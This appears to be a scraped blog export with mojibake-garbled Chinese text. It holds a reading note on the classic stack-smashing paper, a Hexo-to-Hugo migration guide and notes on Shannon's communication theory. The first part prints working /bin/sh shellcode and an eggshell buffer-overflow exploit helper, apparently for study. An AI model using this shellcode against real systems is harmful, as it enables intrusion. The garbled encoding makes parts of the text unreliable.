%l7 and\t%sp, %sp, %o0 add\t%sp, 8, %o1 xor\t%o2, %o2, %o2 add\t%sp, 16, %sp std\t%l6, [%sp - 16] st\t%sp, [%sp - 8] st\t%g0, [%sp - 4] mov\t0x3b, %g1 ta\t8 xor\t%o7, %o7, %o0 mov\t1, %g1 ta\t8 SPARC/SunOS\nsethi 0xbd89a, %l6 or%l6, 0x16e, %l6 sethi 0xbdcda, %l7 and\t%sp, %sp, %o0 add\t%sp, 8, %o1 xor\t%o2, %o2, %o2 add\t%sp, 16, %sp std\t%l6, [%sp - 16] st\t%sp, [%sp - 8] st\t%g0, [%sp - 4] mov\t0x3b, %g1 mov\t-0x1, %l5 ta\t%l5 + 1 xor\t%o7, %o7, %o0 mov\t1, %g1 ta\t%l5 + 1 é™„å½•Bï¼šGeneric Buffer Overflow Program 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  //shellcode.h  #if defined(__i386__) \u0026\u0026 defined(__linux__)  #define NOP_SIZE\t1 char nop[] = \"\\x90\"; char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } #elif defined(__sparc__) \u0026\u0026 defined(__sun__) \u0026\u0026 defined(__svr4__)  #define NOP_SIZE\t4 char nop[]=\"\\xac\\x15\\xa1\\x6e\"; char shellcode[] = \"\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e\" \"\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0\" \"\\xdc\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08\" \"\\x90\\x1b\\xc0\\x0f\\x82\\x10\\x20\\x01\\x91\\xd0\\x20\\x08\"; unsigned long get_sp(void) { __asm__(\"or %sp, %sp, %i0\"); } #elif defined(__sparc__) \u0026\u0026 defined(__sun__)  #define NOP_SIZE 4 char nop[]=\"\\xac\\x15\\xa1\\x6e\"; char shellcode[] = \"\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e\" \"\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0\" \"\\xdc\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\xaa\\x10\\x3f\\xff\" \"\\x91\\xd5\\x60\\x01\\x90\\x1b\\xc0\\x0f\\x82\\x10\\x20\\x01\\x91\\xd5\\x60\\x01\"; unsigned long get_sp(void) { __asm__(\"or %sp, %sp, %i0\"); } #endif    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  //eggshell.c #include \"stdio.h\"#include \"shellcode.h\" #define DEFAULT_OFFSET\t0 #define DEFAULT_BUFFER_SIZE 512 #define DEFAULT_EGG_SIZE\t2048 void usage(void); void main(int argc, char *argv[]) { char *ptr, *bof, *egg; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE; while ((c = getopt(argc, argv, \"ağŸ…±ï¸eâ­•\")) != EOF) switch (c) { case 'a': align = atoi(optarg); break; case 'b': bsize = atoi(optarg); break; case 'e': eggsize = atoi(optarg); break; case 'o': offset = atoi(optarg); break; case '?': usage(); exit(0); } if (strlen(shellcode) \u003e eggsize) { printf(\"Shellcode is larger the the egg.\\n\"); exit(0); } if (!(bof = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } if (!(egg = malloc(eggsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"[ Buffer size:\\t%d\\t\\tEgg size:\\t%d\\tAligment:\\t%d\\t]\\n\", bsize, eggsize, align); printf(\"[ Address:\\t0x%x\\tOffset:\\t\\t%d\\t\\t\\t\\t]\\n\", addr, offset); addr_ptr = (long *) bof; for (i = 0; i \u003c bsize; i+=4) *(addr_ptr++) = addr; ptr = egg; for (i = 0; i \u003c= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE) for (n = 0; n \u003c NOP_SIZE; n++) { m = (n + align) % NOP_SIZE; *(ptr++) = nop[m]; } for (i = 0; i \u003c strlen(shellcode); i++) *(ptr++) = shellcode[i]; bof[bsize - 1] = '\\0'; egg[eggsize - 1] = '\\0'; memcpy(egg,\"EGG=\",4); putenv(egg); memcpy(bof,\"BOF=\",4); putenv(bof); system(\"/bin/sh\"); } void usage(void) { (void)fprintf(stderr, \"usage: eggshell [-a ] [-b ] [-e ] [-o ]\\n\"); }    è¯»åæ„Ÿ é˜…è¯»è¿™ç¯‡è®ºæ–‡åªè¦æœ‰ä¸€ä¸ç‚¹æ±‡ç¼–çŸ¥è¯†å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜ç›¸å…³çš„çŸ¥è¯†\næ„Ÿè§‰è¿™ç¯‡è®ºæ–‡ä»¥æœ€ç®€æ´çš„è¯­è¨€è®²è¿°äº†ç¼“å†²åŒºæº¢å‡ºåˆ°åº•æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œä»é›¶å¼€å§‹æ¼”ç¤ºäº†shellcodeæ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œå¦‚ä½•å°†shellcodeæ”¾å…¥ç¼“å†²åŒºï¼Œå¦‚ä½•å»ä¼˜åŒ–shellcodeï¼ˆè™½ç„¶ç°åœ¨éƒ½ç”¨metasploitç”Ÿæˆäº†ï¼‰ã€‚\nè¿™ç¯‡è®ºæ–‡ä»æå‡ºé—®é¢˜åˆ°è§£å†³é—®é¢˜éƒ½æ„Ÿè§‰é˜è¿°çš„ååˆ†æ¸…æ™°ï¼Œå¦‚æœæƒ³è¦å¿«é€Ÿäº†è§£æ ˆæº¢å‡ºçš„è¯ï¼Œè¿˜æ˜¯å¯ä»¥ç›´æ¥å‚è€ƒctf-wkiä¸­çš„stackoverflowå…¥é—¨\n","description":"","tags":["thesis","studyNote"],"title":"Reading-Note-of-Smashing-The-Stack-For-Fun","uri":"/posts/reading-note-of-smashing-the-stack-for-fun/"},{"categories":[],"content":"ç”·äººéƒ½æ˜¯è§è‰²å¿˜ä¹‰çš„å¤§çŒªè¹„å­ï¼Œä¸€çœ‹è§å¥½çœ‹çš„äººå°±æ²¡äº†ã€‚\nåŸæœ¬å¿ƒæƒ³ç€hexoåšå®¢å°±è¿™æ ·å°†å°±ç”¨ç€å§ï¼Œä¹‹å‰å¬åŒå­¦è¯´hugoæŒºå¥½çš„ä¹Ÿæ²¡åœ¨æ„ï¼Œæ²¡æƒ³åˆ°é‡è§äº†æ›´å¥½çœ‹çš„hugoä¸»é¢˜MemE ï¼Œè¿™ç®€æ´çš„åšå®¢åŠ ä¸Šè¿™æ¸å˜è‰²ï¼Œç›´æ¥è®©æˆ‘æƒ³ç”¨hugoäº†ã€‚\nè€Œä¸”è¿™æ¬¡æ¢ç”µè„‘è®©æˆ‘é‡æ–°ç”Ÿæˆåšå®¢ä¹Ÿé‡åˆ°äº†è®¸å¤šbugï¼Œåªèƒ½å°†hexoç»´æŠ¤åœ¨æ—§ç‰ˆæœ¬ä¹Ÿä¸å¤ªæ–¹ä¾¿ï¼Œäºæ˜¯è¯´åšå°±åšï¼Œæ¥ä¸€æ¬¡å¤§è¿ç§»ã€‚\n Refer:\nhttps://jdhao.github.io/2018/10/10/hexo_to_hugo/\n è¿ç§» æˆ‘è¿™ä¸ºäº†æ–¹ä¾¿å°±å…ˆç”¨scoop search hugoï¼Œå‘ç°scoopçš„ä»“åº“é‡Œæœ‰hugoï¼Œé‚£ä¹ˆå°±ä¸ç”¨åƒhexoé‚£æ ·ç”¨npmå»å®‰è£…äº†ï¼Œååˆ†æ–¹ä¾¿ã€‚\nç›´æ¥scoop install hugo-extended å®Œäº‹ã€‚\nå»ºç«‹åšå®¢ hugoå»ºç«‹æ–°çš„ç«™ç‚¹ï¼šhugo new site \"folder_name\"\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  PS D:\\0project\u003e hugo new site \"hugo\" Congratulations! Your new Hugo site is created in D:\\0project\\hugo. Just a few more steps and you're ready to go: 1. Download a theme into the same-named folder. Choose a theme from https://themes.gohugo.io/ or create your own with the \"hugo new theme \u003cTHEMENAME\u003e\" command. 2. Perhaps you want to add some content. You can add single files with \"hugo new \u003cSECTIONNAME\u003e\\\u003cFILENAME\u003e.\u003cFORMAT\u003e\". 3. Start the built-in live server via \"hugo server\". Visit https://gohugo.io/ for quickstart guide and full documentation. PS D:\\0project\u003e cd hugo PS D:\\0project\\hugo\u003e ls  ç›®å½•: D:\\0project\\hugo Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2021/2/9 14:56 archetypes d----- 2021/2/9 14:56 content d----- 2021/2/9 14:56 data d----- 2021/2/9 14:56 layouts d----- 2021/2/9 14:56 static d----- 2021/2/9 14:56 themes -a---- 2021/2/9 14:56 82 config.toml   ä¸Šé¢æ–‡ä»¶ä¸­ï¼Œhugoä¸hexoçš„å¯¹åº”å…³ç³»å¦‚ä¸‹\n   hugoç›®å½• hexoç›®å½• ä½œç”¨     content source å­˜å‚¨åšæ–‡çš„mdæ–‡ä»¶ï¼Œhexoä¸­çš„_post,_draft,å„è‡ªå®šä¹‰çš„é¡µé¢ç›®å½•å…¶å®å¯¹åº”åˆ°hugoä¸­çš„è¯ï¼Œéƒ½æ˜¯åœ¨contentä¸‹çš„   config.toml _config.yaml ç”¨äºé…ç½®ç«™ç‚¹ä¸­å„é¡¹å‚æ•°   themes themes å­˜æ”¾ä¸»é¢˜   static source hugoä¸­çš„staticç›®å½•ä¸­å­˜æ”¾ä¸€äº›å¸¸è§„é™æ€æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯åšå®¢ä¸­å¼•ç”¨çš„å›¾ç‰‡ã€æ–‡ä»¶ä¹Ÿå¯ä»¥æ˜¯è‡ªæ·»åŠ çš„ä»»æ„æ–‡ä»¶ï¼Œæœ€ç»ˆæ¸²æŸ“éƒ½ä¼šæ”¾åˆ°ç«™ç‚¹çš„æ ¹ç›®å½•   public public å­˜æ”¾æ¸²æŸ“åçš„ç«™ç‚¹é™æ€æ–‡ä»¶   layout æ—  å­˜æ”¾è‡ªå®šä¹‰çš„æ ·å¼å¸ƒå±€æ–‡ä»¶ï¼Œä¼˜å…ˆçº§é«˜äºä¸»é¢˜ä¸­çš„åŒåæ–‡ä»¶ï¼Œæ–¹ä¾¿ä¿®æ”¹ä¸»é¢˜æ ·å¼    å®‰è£…ä¸»é¢˜ å®‰è£…ä¸»é¢˜çš„æµç¨‹è·Ÿhexoæ²¡å•¥åŒºåˆ«ï¼Œç”šè‡³è§‰å¾—æ¯”hexoè¦æ›´ç®€å•ï¼Œå…·ä½“å…¶ä»–ä¸»é¢˜å¯ä»¥å»å®˜ç½‘ä¸»é¢˜åº“æ‰¾ã€‚\n å®˜ç½‘ä¸»é¢˜åº“ï¼šHugo Themes\n æˆ‘è¿™é‡Œå®‰è£…çš„ä¸»é¢˜æ˜¯MemEï¼Œç›´æ¥å¦‚ä¸‹\n1 2 3  PS D:\\0project\\hugo\u003e git init PS D:\\0project\\hugo\u003e git submodule add --depth 1 https://github.com/reuixiy/hugo-theme-meme.git themes/meme PS D:\\0project\\hugo\u003e rm config.toml \u0026\u0026 cp themes/meme/config-examples/zh-cn/config.toml config.toml   ç„¶åå¤åˆ¶é…ç½®æ–‡ä»¶ï¼Œåœ¨é‡Œé¢ä¿®æ”¹ç›¸å…³é€‰é¡¹\nå°†hexoä¸­çš„./hexo/source/_post ç§»åŠ¨è‡³ ./hugo/content/posts\næ³¨æ„åšå®¢è¿ç§»æ—¶ï¼Œè¦å¯¹æ–‡ä»¶å¤´åšä¸€å®šçš„ä¿®æ”¹\n  åŠ å…¥typora-root-url: ..\\..\\static\\res ï¼Œå› ä¸ºä»–ä¸åƒhexoæ”¯æŒpostsä¸‹åŒåæ–‡ä»¶å¤¹çš„èµ„æºå¼•ç”¨ï¼Œè¦å°†æ‰€æœ‰æ–‡ä»¶æ”¾å…¥staticæ‰èƒ½ç”¨ï¼Œå› æ­¤éœ€è¦æ·»åŠ ä¸€è¡Œï¼Œè®©typoraèƒ½å¤Ÿæ­£ç¡®æ˜¾ç¤ºå›¾ç‰‡  å°†æ‰€æœ‰æ–‡ä»¶ç§»è¿›åŒåæ–‡ä»¶å¤¹ä¸­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  import os import sys import shutil # move files to the folder which have the same name. if __name__=='__main__': try: path = sys.argv[1] except Exception: print(\"Usage: python op.py /to/your/path\") exit(0) fileList = os.listdir(path) folders = [] files = [] for item in fileList: item = os.path.join(path, item) if os.path.isdir(item): folders.append(item) elif os.path.isfile(item): files.append(os.path.basename(item)) # print(folders) # assert(0) # move to folder for item in files: folderName = item.split('.')[0] folderPath = os.path.join(path, folderName) # print(folderPath in folders) # assert(0) if folderPath not in folders: os.mkdir(folderPath) shutil.copyfile(os.path.join(path, item), os.path.join(folderPath, item)) print(\"End.......\")   ç„¶åï¼Œå°†å½“å‰ä»“åº“æ·»åŠ ä¸ºè¿œç¨‹åˆ†æ”¯\n1 2 3 4 5 6 7  $ git add . $ git commit -m \"new blog\" $ git branch hugo $ git checkout hugo $ $ git remote add origin git@github.com:username/username.github.io.git $ git push -u origin hugo   ç„¶ååœ¨githubç•Œé¢ï¼Œå°†Settings-\u003eOptions-\u003eGitHub Pages æ”¹æˆGithub actionæ‰€ç”Ÿæˆçš„åˆ†æ”¯ï¼ˆgh-pagesï¼‰\n Refer: https://github.com/reuixiy/io-oi.me/issues/90\nhttps://io-oi.me/tech/custom-domains-on-github-pages/\n è®°å¾—åœ¨~/blog/static/CNAMEï¼ˆHugoï¼‰ï¼Œæ·»åŠ chameï¼Œchameé‡Œä¸ºè‡ªå®šä¹‰åŸŸå\nç„¶åå°±æˆåŠŸéƒ¨ç½²äº†\n   rss Error  http://blog.jiayuanzhang.com/post/add-full-content-rss/\n    This page contains the following errors: error on line 6111 at column 9: PCDATA invalid Char value 19\nBelow is a rendering of the page up to the first error.  åŸå› æ˜¯åšå®¢ä¸­çš„markdown æœ‰ä¸å¯è§å­—ç¬¦å¦‚ï¼ˆ^Eï¼Œ^Hç­‰ç­‰ï¼‰ï¼Œå¯¼è‡´ç”Ÿæˆrssé”™è¯¯\næˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥hexoå°±èƒ½æ­£å¸¸ç”Ÿæˆï¼Œå°†ä¸å¯è§å­—ç¬¦åˆ é™¤åï¼Œrssç”ŸæˆæˆåŠŸ\n","description":"","tags":[],"title":"Hexo2hugo","uri":"/posts/hexo2hugo/"},{"categories":["network"],"content":"ã€è®ºæ–‡é˜…è¯»ç¬”è®°ã€‘A Mathematical Theory of Communication æœ¬ç¯‡åšå®¢é’ˆå¯¹è¿™ç¯‡è®ºæ–‡ï¼Œåšç¿»è¯‘ç¬”è®°ï¼Œä»¥åŠç›¸å…³æ¦‚å¿µå­¦ä¹ ç¬”è®°\næ‰¾åˆ°æœ‰å…³çš„é˜…è¯»ç¬”è®°\u0026èµ„æ–™ä¹Ÿæ”¾åœ¨è¿™é‡Œåšå¤‡ç”¨å‚è€ƒ\n ä¿¡æ¯è®º By jasonxty From CSDN\nA mathmatical theory of communicationé˜…è¯»ç¬”è®°ï¼ˆ1ï¼‰\n  Introduction è¿‘æ¥å…³äºè°ƒåˆ¶ï¼ˆmodulationï¼‰æ–¹æ³•çš„å¤šæ ·åŒ–å‘å±•ï¼Œå¦‚PCMå’ŒPPMï¼ˆå°†å¸¦å®½è½¬åŒ–ä¸ºä¿¡å™ªæ¯”ï¼‰ï¼Œä½¿å¾—äººä»¬å¯¹é€šä¿¡ç†è®ºæœ‰äº†æ›´å¤§çš„å…´è¶£ã€‚è¿™ä¸ªç†è®ºåŸºç¡€è¢«åŒ…å«åœ¨Nyquistå’ŒHartleyåœ¨è¿™é¡¹ä¸»é¢˜çš„é‡è¦paperä¸­ã€‚åœ¨æœ¬è®ºæ–‡ä¸­ï¼Œæˆ‘ä»¬å°†å…¶ç†è®ºæ‰©å±•ä¸ºä¸€ç³»åˆ—æ–°çš„å› ç´ ï¼Œç‰¹åˆ«æ˜¯å™ªå£°åœ¨ä¿¡é“ä¸­çš„å½±å“ã€ä»¥åŠå¯èƒ½ç”±åŸå§‹æ¶ˆæ¯çš„ç»Ÿè®¡ç»“æ„å’Œæœ€ç»ˆç›®çš„åœ°çš„æ€§è´¨æ‰€å¯¼è‡´çš„èŠ‚çœç‰©(savings)ï¼ˆï¼Ÿæš‚æ—¶ä¸çŸ¥é“çœäº†å•¥ï¼‰\n PPMï¼š Pulse Position Modulationï¼Œè„‰å†²ä½ç½®è°ƒåˆ¶ï¼šå¦‚æœè°ƒåˆ¶ä¿¡å·åªä½¿è½½æ³¢è„‰å†²ç³»åˆ—ä¸­æ¯ä¸€ä¸ªè„‰å†²äº§ç”Ÿçš„æ—¶é—´å‘ç”Ÿæ”¹å˜ï¼Œè€Œä¸æ”¹å˜å…¶å½¢çŠ¶å’Œå¹…åº¦ï¼Œä¸”æ¯ä¸€ä¸ªè„‰å†²äº§ç”Ÿæ—¶é—´çš„å˜åŒ–é‡æ¯”ä¾‹äºè°ƒåˆ¶ä¿¡å·ç”µå‹çš„å¹…åº¦ï¼Œä¸è°ƒåˆ¶ä¿¡å·çš„é¢‘ç‡æ— å…³ï¼Œè¿™ç§è°ƒåˆ¶ç§°ä¸ºè„‰å†²ä½ç½®è°ƒåˆ¶ï¼Œç®€ç§°è„‰ä½è°ƒåˆ¶ã€‚\nç›¸å½“äºå¯¹è„‰å†²çš„æ³¢å½¢y=a*sin(bx) æ¥è¯´ï¼Œå–ä»»æ„åŒºé—´ï¼Œè€Œaã€bä¸å˜\n è„‰å†²ä½ç½®è°ƒåˆ¶-ç™¾åº¦ç™¾ç§‘\n PCMï¼š Pulse Code Modulationï¼Œè„‰å†²ç¼–ç è°ƒåˆ¶ ï¼šè„‰å†²ç¼–ç è°ƒåˆ¶æ˜¯æŠŠæ¨¡æ‹Ÿä¿¡å·å˜æ¢ä¸ºæ•°å­—ä¿¡å·çš„ä¸€ç§è°ƒåˆ¶æ–¹å¼ï¼Œå…¶æœ€å¤§çš„ç‰¹ç‚¹æ˜¯æŠŠè¿ç»­è¾“å…¥çš„æ¨¡æ‹Ÿä¿¡å·å˜æ¢ä¸ºåœ¨æ—¶åŸŸå’ŒæŒ¯å¹…ä¸Šéƒ½ç¦»æ•£çš„é‡ï¼Œç„¶åå°†å…¶è½¬åŒ–ä¸ºä»£ç å½¢å¼ä¼ è¾“ï¼Œä¸€ç§å°†æ¨¡æ‹Ÿä¿¡å·ç»è¿‡æŠ½æ ·ã€é‡åŒ–å’Œç¼–ç å˜æ¢æˆæ•°å­—ä¿¡å·çš„ç¼–ç æ–¹å¼\n æŠ½æ ·æ˜¯å°†æ—¶é—´ä¸Šè¿ç»­çš„æ¨¡æ‹Ÿä¿¡å·å˜ä¸ºæ—¶é—´ä¸Šç¦»æ•£çš„æŠ½æ ·ä¿¡å·çš„è¿‡ç¨‹ï¼›é‡åŒ–æ˜¯æŠŠæŠ½æ ·ä¿¡å·å˜ä¸ºå¹…åº¦ç¦»æ•£çš„æ•°å­—ä¿¡å·ï¼›ç¼–ç åˆ™æ˜¯å°†é‡åŒ–åçš„æ•°å­—ä¿¡å·(å¤šè¿›åˆ¶)è¡¨ç¤ºä¸ºäºŒè¿›åˆ¶ç ç»„è¾“å‡ºçš„è¿‡ç¨‹ã€‚ä»è°ƒåˆ¶çš„è§’åº¦æ¥çœ‹ï¼ŒPCMç¼–ç è¿‡ç¨‹å¯ä»¥è®¤ä¸ºæ˜¯ä¸€ç§ç‰¹æ®Šçš„è°ƒåˆ¶æ–¹å¼ï¼Œå³ç”¨æ¨¡æ‹Ÿä¿¡å·å»æ”¹å˜è„‰å†²è½½æ³¢åºåˆ—çš„æœ‰æ— ï¼Œæ‰€ä»¥PCMç§°ä¸ºè„‰å†²ç¼–ç è°ƒåˆ¶ã€‚\n  è„‰å†²ç¼–ç è°ƒåˆ¶-ç™¾åº¦ç™¾ç§‘\nè„‰å†²ç¼–ç è°ƒåˆ¶-MBAç™¾ç§‘\n PCMã€PPMã€PWMä¸‰ä¸ªéƒ½å±äºè„‰å†²è°ƒåˆ¶æŠ€æœ¯ï¼Œåº”ç”¨é¢†åŸŸä¸åŒã€‚PCM:è„‰å†²ç¼–ç è°ƒåˆ¶ï¼Œä»¥çº¦å®šå¥½çš„äºŒè¿›åˆ¶ç æµä¼ é€’ä¿¡æ¯ï¼Œå¯ä»¥æ—¶åˆ†å¤ç”¨ï¼› PPMï¼šè„‰å†²ä½ç½®è°ƒåˆ¶ï¼Œä»¥ä¸åŒæ—¶åˆ»å‡ºç°çš„è„‰å†²ä½ç½®ä¼ é€’ä¿¡æ¯ï¼Œå¯ä»¥æ—¶åˆ†å¤ç”¨ï¼›PWMï¼šè„‰å†²å®½åº¦è°ƒåˆ¶ï¼Œä»¥è„‰å†²å ç©ºæ¯”ä¼ é€’ä¿¡æ¯ï¼Œä¸å¯ä»¥æ—¶åˆ†å¤ç”¨ï¼›PWMä»¥åŠå…¶å˜ç§SPWMå¹¿æ³›ç”¨äºç”µæœºè°ƒé¢‘è°ƒé€Ÿæ§åˆ¶ã€‚PPMå’ŒPCMéƒ½ç”¨äºé¥æ§è®¾å¤‡æ— çº¿ä¼ è¾“ä¸Šï¼ŒPCMå±äºæ•°å­—è°ƒåˆ¶ï¼Œéœ€è¦åˆ©ç”¨é«˜é€ŸADå’ŒDAï¼›PPMåˆ©ç”¨ç§¯åˆ†å™¨å’Œæ»¤æ³¢å™¨ï¼Œå±äºæ¨¡æ‹Ÿè°ƒåˆ¶\n é€šè®¯çš„åŸºæœ¬é—®é¢˜æ˜¯åœ¨ä¸€ç«¯å‡†ç¡®æˆ–è¿‘ä¼¼é‡ç°ä»å¦ä¸€ç«¯é€‰æ‹©çš„æ¶ˆæ¯ã€‚é€šå¸¸æ¶ˆæ¯éƒ½ä¼šæœ‰è¯­ä¹‰ï¼Œï¼ˆåº”è¯¥æŒ‡è¯­ä¹‰ï¼‰å³ä¸ä¸€äº›ç‰©ç†å®ä½“ç³»ç»Ÿæˆ–æ¦‚å¿µå®ä½“ç³»ç»Ÿç›¸å…³è”çš„ä¸œè¥¿ã€‚é€šä¿¡çš„è¯­ä¹‰å±‚é¢ä¸å…·ä½“çš„å·¥ç¨‹é—®é¢˜æ˜¯æ— å…³ã€‚é€šä¿¡é‡è¦å±‚é¢æ˜¯å®é™…ä¿¡æ¯æ˜¯ä¸€ç§ä»ä¸€ä¸ªå¯èƒ½çš„é›†åˆé‡Œé€‰æ‹©æ‰€å¾—åˆ°çš„ä¿¡æ¯ã€‚è¿™ä¸ªç³»ç»Ÿå¿…é¡»æ˜¯è¢«è®¾è®¡ä¸ºå¯¹æ¯ä¸ªå¯èƒ½çš„é€‰æ‹©è¿›è¡Œæ“ä½œï¼Œè€Œä¸ä»…ä»…æ˜¯å¤„ç†å®é™…é€‰æ‹©çš„ç³»ç»Ÿï¼Œå› ä¸ºä¿¡æ¯åœ¨è®¾è®¡æ—¶æ˜¯æœªçŸ¥çš„ã€‚\n è¿™é‡ŒæåŠåˆ°äº†ä¿¡æ¯è®ºä¸­ä¿¡æ¯çš„æ¦‚å¿µï¼š\nä¿¡æ¯ï¼šæŒ‡å„ä¸ªäº‹ç‰©è¿åŠ¨çš„çŠ¶æ€åŠçŠ¶æ€å˜åŒ–çš„æ–¹å¼ï¼Œæ˜¯æŠ½è±¡çš„æ„è¯†æˆ–çŸ¥è¯†ã€‚\nè€Œä¿¡æ¯çš„åŸºæœ¬æ¦‚å¿µåœ¨äºä»–çš„ä¸ç¡®å®šæ€§ï¼Œä»»ä½•å·²ç¡®å®šçš„äº‹ç‰©éƒ½ä¸å«æœ‰ä¿¡æ¯ã€‚ä¿¡æ¯æ˜¯èƒ½ä½¿è®¤è¯†ä¸»é¢˜å¯¹æŸä¸€äº‹ç‰©çš„æœªæ‰§è¡Œæˆ–ä¸ç¡®å®šæ€§å‡å°‘çš„æœ‰ç”¨çŸ¥è¯†ã€‚\nå› è€Œåœ¨è¯¥æ®µä¸­ï¼Œé€šä¿¡ç³»ç»Ÿéœ€è¦ä¸ºä¿¡æ¯çš„æ¯ä¸ªå¯èƒ½è¿›è¡Œæ“ä½œçš„è®¾è®¡ï¼Œ\n å‡å¦‚åœ¨æ¶ˆæ¯é›†åˆä¸­çš„å…ƒç´ ä¸ªæ•°æ˜¯æœ‰é™çš„ï¼Œé‚£ä¹ˆå½“ä¸€ä¸ªæ¶ˆæ¯ä»é›†åˆä¸­è¢«é€‰ä¸­æ—¶ï¼ˆæ‰€æœ‰çš„é€‰æ‹©æ˜¯ç­‰å¯èƒ½çš„ï¼‰ï¼Œè¿™ä¸ªå…ƒç´ çš„æ•°ç›®æˆ–è€…å…¶å¯¹åº”çš„å•è°ƒå‡½æ•°å¯ä»¥è¢«çœ‹ä½œä¸€ç§ä¿¡æ¯ç”Ÿæˆçš„é‡åº¦ã€‚æ­£å¦‚Hartleyæ‰€æŒ‡å‡ºï¼Œå¯¹æ•°å‡½æ•°æ˜¯æœ€è‡ªç„¶ï¼ˆåˆé€‚ï¼‰çš„é€‰æ‹©ã€‚å°½ç®¡å½“æˆ‘ä»¬è€ƒè™‘æ¶ˆæ¯çš„ç»Ÿè®¡å­¦å½±å“æ—¶ä»¥åŠå½“æˆ‘ä»¬æœ‰ä¸€ç³»åˆ—è¿ç»­èŒƒå›´çš„æ¶ˆæ¯æ—¶ï¼Œè¿™ä¸ªå®šä¹‰éœ€è¦å¾—åˆ°ç›¸å½“å¹¿æ³›çš„æ¨å¹¿ï¼Œæˆ‘ä»¬å°†åœ¨æ‰€æœ‰æƒ…å†µä¸‹ä½¿ç”¨å¯¹æ•°å‡½æ•°è¿›è¡Œæœ¬è´¨ä¸Šçš„åº¦é‡\n æ¶‰åŠåˆ°äº†ä¿¡æ¯ç†µçš„æ¦‚å¿µ\nè¿™é‡Œåˆ©ç”¨å¦‚ä½•å»æµ‹é‡ä¿¡æ¯çš„å¤šå°‘å»ä¾§é¢å®šä¹‰ä¿¡æ¯\n ä¸Šè¿°ä½¿ç”¨å¯¹æ•°å‡½æ•°æ›´æ–¹ä¾¿çš„åŸå› å¦‚ä¸‹\n1.å¯¹æ•°å‡½æ•°å®é™…ä¸Šéå¸¸å¥½ç”¨ã€‚å…³äºå·¥ç¨‹çš„é‡è¦å‚æ•°ï¼ˆä¾‹å¦‚æ—¶é—´ã€å¸¦å®½ã€æ—¶å»¶ç­‰ç­‰ï¼‰åœ¨å–å¯¹æ•°çš„æƒ…å†µä¸‹è¶‹å‘äºä¸åŒçš„çº¿æ€§å…³ç³»ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨ä¸€ä¸ªç»„ä¸­æ·»åŠ ä¸€ä¸ªä¸­ç»§å¯ä»¥ä½¿ä¸­ç»§çš„å¯èƒ½çŠ¶æ€æ•°åŠ å€ï¼Œç„¶è€Œåœ¨å–ä»¥2ä¸ºåº•çš„å¯¹æ•°çš„æƒ…å†µä¸‹åªåŠ äº†1ã€‚å°†æ—¶é—´åŠ å€æœ‰å¯èƒ½ä½¿æ¶ˆæ¯æ•°é‡æˆå¹³æ–¹çš„å¢é•¿ï¼Œä½†åœ¨å–å¯¹æ•°çš„æƒ…å†µä¸‹ä»…ä»…æ˜¯ä¹˜ä»¥2å€ï¼Œç­‰ç­‰ã€‚\n2.åˆé€‚çš„æ–¹æ³•èƒ½å¤Ÿä½¿æ•°æ®è®©æˆ‘ä»¬æœ‰æ›´åŠ ç›´è§‚çš„æ„Ÿå—ã€‚æˆ‘ä»¬é€šè¿‡ä¸æ™®é€šæ ‡å‡†çš„çº¿æ€§æ¯”è¾ƒç›´è§‚åœ°æµ‹é‡å®ä½“ï¼ˆè¿™ä¸Nyquistçš„ä¸€ç¯‡è®ºæ–‡å¯†åˆ‡ç›¸å…³ï¼‰ã€‚ä¾‹å¦‚æˆ‘ä»¬è®¤ä¸ºï¼Œä¸¤å‰¯æ‰‘å…‹çš„ä¿¡æ¯å­˜å‚¨å®¹é‡æ˜¯ä¸€å‰¯æ‰‘å…‹çš„ä¸¤å€ï¼Œä¸¤ä¸ªç›¸åŒçš„ä¿¡é“ä¼ è¾“çš„ä¿¡æ¯çš„å®¹é‡åº”è¯¥æ˜¯ä¸€ä¸ªä¿¡é“å®¹é‡çš„ä¸¤å€ã€‚\n3.è¿™åœ¨æ•°å­¦ä¸Šæ›´åŠ 